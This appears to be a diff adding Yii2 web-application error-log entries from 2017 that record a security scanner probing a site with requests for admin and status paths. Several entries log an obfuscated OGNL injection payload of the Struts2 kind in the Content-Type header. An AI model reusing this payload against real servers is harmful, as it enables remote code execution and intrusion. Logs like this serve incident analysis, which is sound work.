@@ -52385,3 +52385,1153 @@ Stack trace:
     'REQUEST_TIME_FLOAT' => 1499916905.5048
     'REQUEST_TIME' => 1499916905
 ]
+2017-07-13 11:38:00 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "clusters.jsf".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('clusters.jsf', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:38:00 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:38:00 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/clusters.jsf'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '43313'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499917080.6218
+    'REQUEST_TIME' => 1499917080
+]
+2017-07-13 11:41:04 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/layouts/main.php:158
+    in /edu/frontend/controllers/SiteController.php:32
+2017-07-13 11:41:04 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/index.php'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '14314'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499917264.1393
+    'REQUEST_TIME' => 1499917264
+]
+2017-07-13 11:44:03 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "rs-status".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('rs-status', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:44:03 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:44:03 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/rs-status'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '40868'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499917443.5218
+    'REQUEST_TIME' => 1499917443
+]
+2017-07-13 11:48:37 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "master-status".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('master-status', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:48:37 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:48:37 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/master-status'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '51594'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499917717.7487
+    'REQUEST_TIME' => 1499917717
+]
+2017-07-13 11:50:17 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/layouts/main.php:158
+    in /edu/frontend/controllers/SiteController.php:32
+2017-07-13 11:50:17 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data'
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '38782'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_HOST' => '120.27.33.23'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_CONTENT_TYPE' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499917817.2672
+    'REQUEST_TIME' => 1499917817
+]
+2017-07-13 11:50:32 [140.205.225.189][-][-][error][yii\web\HttpException:400] exception 'yii\web\BadRequestHttpException' with message '您提交的数据无法被验证。' in /edu/vendor/yiisoft/yii2/web/Controller.php:110
+Stack trace:
+#0 /edu/frontend/components/Controller.php(13): yii\web\Controller->beforeAction(Object(yii\base\InlineAction))
+#1 /edu/vendor/yiisoft/yii2/base/Controller.php(152): frontend\components\Controller->beforeAction(Object(yii\base\InlineAction))
+#2 /edu/vendor/yiisoft/yii2/base/Module.php(454): yii\base\Controller->runAction('index', Array)
+#3 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('', Array)
+#4 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#5 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#6 {main}
+2017-07-13 11:50:32 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_500.php:33
+    in /edu/frontend/controllers/SiteController.php:105
+2017-07-13 11:50:32 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'POST'
+    'CONTENT_TYPE' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data'
+    'CONTENT_LENGTH' => '1'
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '46675'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_HOST' => '120.27.33.23'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_CONTENT_TYPE' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'HTTP_CONTENT_LENGTH' => '1'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499917832.3786
+    'REQUEST_TIME' => 1499917832
+]
+2017-07-13 11:51:42 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "dfshealth.html".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('dfshealth.html', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:51:42 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:51:42 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/dfshealth.html'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '15521'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499917902.3172
+    'REQUEST_TIME' => 1499917902
+]
+2017-07-13 11:53:15 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request: about/' in /edu/vendor/yiisoft/yii2/base/Controller.php:125
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Module.php(454): yii\base\Controller->runAction('', Array)
+#1 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('about/', Array)
+#2 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#3 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#4 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:53:15 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:53:15 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/about/'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '4097'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499917995.1275
+    'REQUEST_TIME' => 1499917995
+]
+2017-07-13 11:53:37 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "warning".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('warning', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:53:37 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:53:37 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/warning'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '15401'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918017.764
+    'REQUEST_TIME' => 1499918017
+]
+2017-07-13 11:53:46 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "pleasereadthis".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('pleasereadthis', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
+2017-07-13 11:53:46 [140.205.225.189][-][-][warning][yii\debug\Module::checkAccess] Access to debugger is denied due to IP address restriction. The requesting IP address is 140.205.225.189
+    in /edu/frontend/views/site/error_404.php:33
+    in /edu/frontend/controllers/SiteController.php:103
+2017-07-13 11:53:46 [140.205.225.189][-][-][info][application] $_SERVER = [
+    'TEMP' => '/tmp'
+    'TMPDIR' => '/tmp'
+    'TMP' => '/tmp'
+    'PATH' => '/usr/local/bin:/usr/bin:/bin'
+    'USER' => 'www'
+    'HOME' => '/home/www'
+    'FCGI_ROLE' => 'RESPONDER'
+    'SCRIPT_FILENAME' => '/edu/frontend/web/index.php'
+    'QUERY_STRING' => ''
+    'REQUEST_METHOD' => 'GET'
+    'CONTENT_TYPE' => ''
+    'CONTENT_LENGTH' => ''
+    'SCRIPT_NAME' => '/index.php'
+    'REQUEST_URI' => '/pleasereadthis'
+    'DOCUMENT_URI' => '/index.php'
+    'DOCUMENT_ROOT' => '/edu/frontend/web'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_SCHEME' => 'http'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_SOFTWARE' => 'nginx/1.10.0'
+    'REMOTE_ADDR' => '140.205.225.189'
+    'REMOTE_PORT' => '20176'
+    'SERVER_ADDR' => '120.27.33.23'
+    'SERVER_PORT' => '80'
+    'SERVER_NAME' => 'mxker.cn'
+    'REDIRECT_STATUS' => '200'
+    'HTTP_REFERER' => 'http://120.27.33.23/'
+    'HTTP_USER_AGENT' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)'
+    'HTTP_HOST' => '120.27.33.23:80'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1499918026.7469
+    'REQUEST_TIME' => 1499918026
+]
+2017-07-13 11:53:50 [140.205.225.189][-][-][error][yii\web\HttpException:404] exception 'yii\base\InvalidRouteException' with message 'Unable to resolve the request "please_read/_search".' in /edu/vendor/yiisoft/yii2/base/Module.php:462
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/web/Application.php(100): yii\base\Module->runAction('please_read/_se...', Array)
+#1 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#3 {main}
+
+Next exception 'yii\web\NotFoundHttpException' with message '页面未找到。' in /edu/vendor/yiisoft/yii2/web/Application.php:112
+Stack trace:
+#0 /edu/vendor/yiisoft/yii2/base/Application.php(375): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 /edu/frontend/web/index.php(16): yii\base\Application->run()
+#2 {main}
